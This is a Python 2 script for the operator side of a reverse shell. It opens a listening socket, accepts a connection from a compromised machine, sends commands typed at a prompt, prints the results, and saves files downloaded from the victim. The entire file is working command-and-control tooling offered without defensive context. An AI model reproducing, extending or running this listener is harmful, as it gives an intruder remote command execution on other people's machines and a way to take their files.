#!/usr/bin/env python

import socket, json

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connections.")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        self.connection.send(json.dumps(data))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.listener.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            result = self.execute_remotely(command)
            if command[0] == "download":
                result = self.write_file("Downloads/" + command[1], result)
            print(result)
